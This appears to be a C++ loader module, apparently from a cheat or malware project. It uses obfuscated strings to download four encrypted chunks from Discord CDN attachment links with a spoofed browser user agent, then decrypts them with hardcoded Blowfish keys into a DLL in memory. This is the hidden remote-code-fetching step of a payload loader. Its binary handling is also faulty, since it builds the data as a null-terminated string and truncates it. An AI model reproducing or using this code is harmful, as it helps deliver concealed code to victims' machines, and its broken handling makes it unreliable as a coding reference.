#include "blowfish.h"
#include <WinInet.h>
#include "../auth/sk.h"

#define sk(x) skCrypt(x).decrypt()

struct EncryptedData_t
{
    std::string a;
    std::string b;
    std::string c;
    std::string d;
};

BLOWFISH blowfish1("0096442170857917");
BLOWFISH blowfish2("1460853456758055");
BLOWFISH blowfish3("7798751519739505");
BLOWFISH blowfish4("1238150549789312");

std::string StreamFileToMemString(std::wstring URL)
{
    const wchar_t* header = L"Accept: *" "/" "*\r\n\r\n";
    HANDLE hInterWebz = InternetOpen(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, NULL);
    HANDLE hURL = InternetOpenUrl(hInterWebz, URL.c_str(), header, lstrlen(header), INTERNET_FLAG_DONT_CACHE, 0);

    char* Buffer = new char[100000000]; //100mb
    memset(Buffer, 0, 100000000);
    DWORD BytesRead = 1;

    std::string data;

    if (InternetReadFile(hURL, Buffer, 100000000, &BytesRead))
    {
        data = std::string(Buffer);
    }

    delete[] Buffer;
    InternetCloseHandle(hInterWebz);
    InternetCloseHandle(hURL);

    return data;
}

std::string Decrypt(EncryptedData_t encryptedData)
{
    std::string BufferDecrypted = blowfish1.Decrypt_CBC(encryptedData.a);
    BufferDecrypted += blowfish2.Decrypt_CBC(encryptedData.b);
    BufferDecrypted += blowfish3.Decrypt_CBC(encryptedData.c);
    BufferDecrypted += blowfish4.Decrypt_CBC(encryptedData.d);

    return BufferDecrypted;
}

std::string GetDecryptedDLL()
{
    std::string data1 = StreamFileToMemString(sk(LR"(https://cdn.discordapp.com/attachments/1087120610716569730/1091795978379608235/1)"));
    std::string data2 = StreamFileToMemString(sk(LR"(https://cdn.discordapp.com/attachments/1087120610716569730/1091795977469440070/2)"));
    std::string data3 = StreamFileToMemString(sk(LR"(https://cdn.discordapp.com/attachments/1087120610716569730/1091795977800782035/3)"));
    std::string data4 = StreamFileToMemString(sk(LR"(https://cdn.discordapp.com/attachments/1087120610716569730/1091795978106974360/4)"));

    std::string decryptedDLL = Decrypt({ data1, data2, data3, data4 });

    return decryptedDLL;
}
